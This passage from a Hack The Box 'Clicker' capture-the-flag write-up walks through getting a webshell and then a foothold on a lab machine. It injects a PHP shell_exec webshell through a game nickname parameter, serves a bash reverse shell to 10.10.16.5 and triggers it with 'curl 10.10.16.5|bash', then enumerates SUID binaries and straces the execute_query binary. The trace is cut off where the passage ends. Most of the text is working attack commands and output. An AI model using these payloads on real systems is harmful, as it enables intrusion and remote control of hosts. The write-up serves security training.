+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/32.png"/><br/><br/>
+This implies that we can leverage functions such as <code>system()</code>, <code>shell_exec()</code>, <code>popen()</code>, etc., enabling us to achieve Remote Code Execution (RCE) on the victim machine.<br/><br/>
+I will use the <code>shell_exec</code> function to get a webshell. This will be the request to the <code>save_profile.php</code> section:<br/><br/>
+<div class="highlight"><pre><span></span>GET /save_game.php?clicks=999999&amp;level=999999&amp;nickname=&lt;?php echo shell_exec($_GET['cmd']); ?&gt;
+</pre></div>
+
+I URL-Encoded the payload to avoid problems:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/33.png"/><br/><br/>
+Before utilizing the export function, I will log in again.<br/><br/>
+Now I will use the export function passing <code>php</code> as the extension value:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/34.png"/><br/><br/>
+Once again, the response provides us a route to the exported file with the php extension:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/35.png"/><br/><br/>
+When accessing the new php file, we will see the following content:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/36.png"/><br/><br/>
+Nothing is being displayed; let's try to add the <code>cmd</code> GET parameter and specify <code>id</code>:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/37.png"/><br/><br/>
+Finally, we have achieved Remote Code Execution (RCE) on the victim machine.<br/><br/>
+To gain access to the system, I will start a reverse shell with bash. Firstly I will create a malicious index.html file with the following content:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">cat</span> <span class="n">index</span><span class="o">.</span><span class="n">html</span>
+<span class="c1">#!/bin/bash</span>
+<span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">10.10.16.5</span><span class="o">/</span><span class="mi">3001</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
+</pre></div>
+
+Now I will serve this file via an HTTP server on port 80:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+</pre></div>
+
+Then, I will setup my netcat listener on port 3001:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span><span class="n">SVN</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
+</pre></div>
+
+Finally, I will execute the command <code>curl 10.10.16.5|bash</code> on the victim machine:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://clicker.htb/exports/top_players_huvidmb5.php?cmd=curl%2010.10.16.5|bash'</span>
+</pre></div>
+
+And we receive the reverse shell on the netcat listener:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span><span class="n">SVN</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="kn">from</span> <span class="mf">10.10.11.232</span><span class="p">:</span><span class="mf">44660.</span>
+<span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">1212</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
+<span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
+<span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">exports$</span>
+</pre></div>
+
+We have successfully accessed the system, now we will simply adjust the TTY to interact more comfortably with the system:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">exports$</span>  <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
+<span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
+<span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">output</span> <span class="n">log</span> <span class="n">file</span> <span class="ow">is</span> <span class="s1">'/dev/null'</span><span class="o">.</span>
+<span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">exports$</span>  <span class="o">^</span><span class="n">Z</span>
+<span class="n">zsh</span><span class="p">:</span> <span class="n">suspended</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+
+<span class="nd">elswix@kali$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
+<span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span> <span class="n">continued</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+                               <span class="n">reset</span>
+<span class="n">reset</span><span class="p">:</span> <span class="n">unknown</span> <span class="n">terminal</span> <span class="nb">type</span> <span class="n">unknown</span>
+<span class="n">Terminal</span> <span class="nb">type</span><span class="err">?</span> <span class="n">xterm</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">exports$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
+<span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">exports$</span> <span class="n">export</span> <span class="n">SHELL</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">exports$</span>
+</pre></div>
+<h3><br>Shell as jack</br></h3><br>
+As <code>www-data</code>, we don't belong to any interesting group:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb$</span> <span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span>
+<span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb$</span>
+</pre></div>
+
+Upon looking for interesting Set-UID binaries, I obtained the following result:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sudo</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chsh</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">gpasswd</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">fusermount3</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">su</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">umount</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">newgrp</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chfn</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">passwd</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mount</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">openssh</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">keysign</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="n">daemon</span><span class="o">-</span><span class="n">launch</span><span class="o">-</span><span class="n">helper</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">libexec</span><span class="o">/</span><span class="n">polkit</span><span class="o">-</span><span class="n">agent</span><span class="o">-</span><span class="n">helper</span><span class="o">-</span><span class="mi">1</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">mount</span><span class="o">.</span><span class="n">nfs</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">execute_query</span>
+<span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb$</span>
+</pre></div>
+
+In this output, we can highlight the <code>execute_query</code> binary, located in the <code>/opt</code> directory, as a potential path for privilege escalation.<br/><br/>
+Upon checking its privileges, I noticed that <code>Jack</code> owns this binary:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">execute_query</span>
+<span class="o">-</span><span class="n">rwsrwsr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">jack</span> <span class="n">jack</span> <span class="mi">16368</span> <span class="n">Feb</span> <span class="mi">26</span>  <span class="mi">2023</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">execute_query</span>
+<span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb$</span>
+</pre></div>
+
+For those who don't know what a Set-UID binary is, here is a brief explanation:<br/><br/>
+A Set-UID (Set User ID) binary is a program executable in Unix and Unix-like operating systems that has special permissions. When a user executes a Set-UID binary, the program runs with the effective user ID (EUID) of the binary's owner rather than the user who launched it. This allows ordinary users to perform certain privileged operations that typically only the owner of the binary (often a system administrator) would be allowed to do.<br/><br/>
+When launching it, the following output was returned:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb$</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">execute_query</span>
+<span class="n">ERROR</span><span class="p">:</span> <span class="ow">not</span> <span class="n">enough</span> <span class="n">arguments</span>
+<span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb$</span>
+</pre></div>
+
+When moving to the <code>/opt</code> directory I found a bash script owned by root:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">opt</span>
+<span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">opt$</span> <span class="n">ls</span>
+<span class="n">manage</span>  <span class="n">monitor</span><span class="o">.</span><span class="n">sh</span>
+<span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">opt$</span>
+</pre></div>
+
+At this point it is useless.<br/><br/>
+The <code>manage</code> directory also has a <code>README.txt</code> file in it:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">opt$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="n">manage</span>
+<span class="n">total</span> <span class="mi">20</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">jack</span> <span class="n">jack</span>   <span class="mi">256</span> <span class="n">Jul</span> <span class="mi">21</span>  <span class="mi">2023</span> <span class="n">README</span><span class="o">.</span><span class="n">txt</span>
+<span class="o">-</span><span class="n">rwsrwsr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">jack</span> <span class="n">jack</span> <span class="mi">16368</span> <span class="n">Feb</span> <span class="mi">26</span>  <span class="mi">2023</span> <span class="n">execute_query</span>
+<span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">opt$</span>
+</pre></div>
+
+The <code>README.txt</code> file explains how to use the binary:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">manage$</span> <span class="n">cat</span> <span class="n">README</span><span class="o">.</span><span class="n">txt</span> 
+<span class="n">Web</span> <span class="n">application</span> <span class="n">Management</span>
+
+<span class="n">Use</span> <span class="n">the</span> <span class="n">binary</span> <span class="n">to</span> <span class="n">execute</span> <span class="n">the</span> <span class="n">following</span> <span class="n">task</span><span class="p">:</span>
+    <span class="o">-</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Creates</span> <span class="n">the</span> <span class="n">database</span> <span class="n">structure</span> <span class="ow">and</span> <span class="n">adds</span> <span class="n">user</span> <span class="n">admin</span>
+    <span class="o">-</span> <span class="mi">2</span><span class="p">:</span> <span class="n">Creates</span> <span class="n">fake</span> <span class="n">players</span> <span class="p">(</span><span class="n">better</span> <span class="ow">not</span> <span class="n">tell</span> <span class="n">anyone</span><span class="p">)</span>
+    <span class="o">-</span> <span class="mi">3</span><span class="p">:</span> <span class="n">Resets</span> <span class="n">the</span> <span class="n">admin</span> <span class="n">password</span>
+    <span class="o">-</span> <span class="mi">4</span><span class="p">:</span> <span class="n">Deletes</span> <span class="nb">all</span> <span class="n">users</span> <span class="k">except</span> <span class="n">the</span> <span class="n">admin</span>
+<span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">manage$</span>
+</pre></div>
+
+Let's see what happens if I insert <code>1</code> as parameter:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">manage$</span> <span class="o">./</span><span class="n">execute_query</span> <span class="mi">1</span>
+<span class="n">mysql</span><span class="p">:</span> <span class="p">[</span><span class="ne">Warning</span><span class="p">]</span> <span class="n">Using</span> <span class="n">a</span> <span class="n">password</span> <span class="n">on</span> <span class="n">the</span> <span class="n">command</span> <span class="n">line</span> <span class="n">interface</span> <span class="n">can</span> <span class="n">be</span> <span class="n">insecure</span><span class="o">.</span>
+<span class="o">--------------</span>
+<span class="n">CREATE</span> <span class="n">TABLE</span> <span class="n">IF</span> <span class="n">NOT</span> <span class="n">EXISTS</span> <span class="n">players</span><span class="p">(</span><span class="n">username</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span> <span class="n">nickname</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span> <span class="n">password</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span> <span class="n">role</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span> <span class="n">clicks</span> <span class="n">bigint</span><span class="p">,</span> <span class="n">level</span> <span class="nb">int</span><span class="p">,</span> <span class="n">PRIMARY</span> <span class="n">KEY</span> <span class="p">(</span><span class="n">username</span><span class="p">))</span>
+<span class="o">--------------</span>
+
+<span class="o">--------------</span>
+<span class="n">INSERT</span> <span class="n">INTO</span> <span class="n">players</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">nickname</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">role</span><span class="p">,</span> <span class="n">clicks</span><span class="p">,</span> <span class="n">level</span><span class="p">)</span> 
+    <span class="n">VALUES</span> <span class="p">(</span><span class="s1">'admin'</span><span class="p">,</span> <span class="s1">'admin'</span><span class="p">,</span> <span class="s1">'ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82'</span><span class="p">,</span> <span class="s1">'Admin'</span><span class="p">,</span> <span class="mi">999999999999999999</span><span class="p">,</span> <span class="mi">999999999</span><span class="p">)</span>
+    <span class="n">ON</span> <span class="n">DUPLICATE</span> <span class="n">KEY</span> <span class="n">UPDATE</span> <span class="n">username</span><span class="o">=</span><span class="n">username</span>
+<span class="o">--------------</span>
+
+<span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">manage$</span>
+</pre></div>
+
+The output shows an interesting message:<br/><br/>
+<div class="highlight"><pre><span></span>mysql: [Warning] Using a password on the command line interface can be insecure.
+</pre></div>
+
+Based on this, it seems that this program executes a system-wide command. <br/><br/>
+Upon examining the printable characters of the binary, it is evident that the <code>system()</code> function is called within this binary:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">manage$</span> <span class="n">strings</span> <span class="n">execute_query</span>  <span class="o">|</span> <span class="n">grep</span> <span class="n">system</span>
+<span class="n">system</span>
+<span class="n">system</span><span class="nd">@GLIBC_2</span><span class="mf">.2.5</span>
+<span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">manage$</span>
+</pre></div>
+
+If I run this binary using <code>strace</code> (to gather information about the behavior of the program), we can observe the following:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">manage$</span> <span class="n">strace</span> <span class="o">./</span><span class="n">execute_query</span> <span class="mi">1</span>
+<span class="n">execve</span><span class="p">(</span><span class="s2">"./execute_query"</span><span class="p">,</span> <span class="p">[</span><span class="s2">"./execute_query"</span><span class="p">,</span> <span class="s2">"1"</span><span class="p">],</span> <span class="mh">0x7ffda0cccc78</span> <span class="o">/*</span> <span class="mi">20</span> <span class="nb">vars</span> <span class="o">*/</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">access</span><span class="p">(</span><span class="s2">"/etc/suid-debug"</span><span class="p">,</span> <span class="n">F_OK</span><span class="p">)</span>         <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="n">ENOENT</span> <span class="p">(</span><span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">directory</span><span class="p">)</span>
+<span class="n">brk</span><span class="p">(</span><span class="n">NULL</span><span class="p">)</span>                               <span class="o">=</span> <span class="mh">0x562205129000</span>
+<span class="n">arch_prctl</span><span class="p">(</span><span class="mh">0x3001</span> <span class="o">/*</span> <span class="n">ARCH_</span><span class="err">???</span> <span class="o">*/</span><span class="p">,</span> <span class="mh">0x7ffca0a4bba0</span><span class="p">)</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="n">EINVAL</span> <span class="p">(</span><span class="n">Invalid</span> <span class="n">argument</span><span class="p">)</span>
+<span class="n">fcntl</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">F_GETFD</span><span class="p">)</span>                       <span class="o">=</span> <span class="mi">0</span>
+<span class="n">fcntl</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">F_GETFD</span><span class="p">)</span>                       <span class="o">=</span> <span class="mi">0</span>
+<span class="n">fcntl</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">F_GETFD</span><span class="p">)</span>                       <span class="o">=</span> <span class="mi">0</span>
+<span class="n">access</span><span class="p">(</span><span class="s2">"/etc/suid-debug"</span><span class="p">,</span> <span class="n">F_OK</span><span class="p">)</span>         <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="n">ENOENT</span> <span class="p">(</span><span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">directory</span><span class="p">)</span>
+<span class="n">mmap</span><span class="p">(</span><span class="n">NULL</span><span class="p">,</span> <span class="mi">8192</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x7f920b2d9000</span>
+<span class="n">access</span><span class="p">(</span><span class="s2">"/etc/ld.so.preload"</span><span class="p">,</span> <span class="n">R_OK</span><span class="p">)</span>      <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="n">ENOENT</span> <span class="p">(</span><span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">directory</span><span class="p">)</span>
+<span class="n">openat</span><span class="p">(</span><span class="n">AT_FDCWD</span><span class="p">,</span> <span class="s2">"/etc/ld.so.cache"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="o">|</span><span class="n">O_CLOEXEC</span><span class="p">)</span> <span class="o">=</span> <span class="mi">3</span>
+<span class="n">newfstatat</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="p">{</span><span class="n">st_mode</span><span class="o">=</span><span class="n">S_IFREG</span><span class="o">|</span><span class="mi">0644</span><span class="p">,</span> <span class="n">st_size</span><span class="o">=</span><span class="mi">21007</span><span class="p">,</span> <span class="o">...</span><span class="p">},</span> <span class="n">AT_EMPTY_PATH</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">mmap</span><span class="p">(</span><span class="n">NULL</span><span class="p">,</span> <span class="mi">21007</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x7f920b2d3000</span>
+<span class="n">close</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>                                <span class="o">=</span> <span class="mi">0</span>
+<span class="n">openat</span><span class="p">(</span><span class="n">AT_FDCWD</span><span class="p">,</span> <span class="s2">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="o">|</span><span class="n">O_CLOEXEC</span><span class="p">)</span> <span class="o">=</span> <span class="mi">3</span>
+<span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s2">"</span><span class="se">\177</span><span class="s2">ELF</span><span class="se">\2\1\1\3\0\0\0\0\0\0\0\0\3\0</span><span class="s2">&gt;</span><span class="se">\0\1\0\0\0</span><span class="s2">P</span><span class="se">\237\2\0\0\0\0\0</span><span class="s2">"</span><span class="o">...</span><span class="p">,</span> <span class="mi">832</span><span class="p">)</span> <span class="o">=</span> <span class="mi">832</span>
+<span class="n">pread64</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s2">"</span><span class="se">\6\0\0\0\4\0\0\0</span><span class="s2">@</span><span class="se">\0\0\0\0\0\0\0</span><span class="s2">@</span><span class="se">\0\0\0\0\0\0\0</span><span class="s2">@</span><span class="se">\0\0\0\0\0\0\0</span><span class="s2">"</span><span class="o">...</span><span class="p">,</span> <span class="mi">784</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span> <span class="o">=</span> <span class="mi">784</span>
+<span class="n">pread64</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s2">"</span><span class="se">\4\0\0\0</span><span class="s2"> </span><span class="se">\0\0\0\5\0\0\0</span><span class="s2">GNU</span><span class="se">\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0</span><span class="s2">"</span><span class="o">...</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">848</span><span class="p">)</span> <span class="o">=</span> <span class="mi">48</span>
+<span class="n">pread64</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s2">"</span><span class="se">\4\0\0\0\24\0\0\0\3\0\0\0</span><span class="s2">GNU</span><span class="se">\0\"\233</span><span class="s2">}</span><span class="se">\305\t\5</span><span class="s2">?</span><span class="se">\344\337</span><span class="s2">^)</span><span class="se">\350</span><span class="s2">b</span><span class="se">\231\21\360</span><span class="s2">"</span><span class="o">...</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">896</span><span class="p">)</span> <span class="o">=</span> <span class="mi">68</span>
+<span class="n">newfstatat</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="p">{</span><span class="n">st_mode</span><span class="o">=</span><span class="n">S_IFREG</span><span class="o">|</span><span class="mi">0755</span><span class="p">,</span> <span class="n">st_size</span><span class="o">=</span><span class="mi">2216304</span><span class="p">,</span> <span class="o">...</span><span class="p">},</span> <span class="n">AT_EMPTY_PATH</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
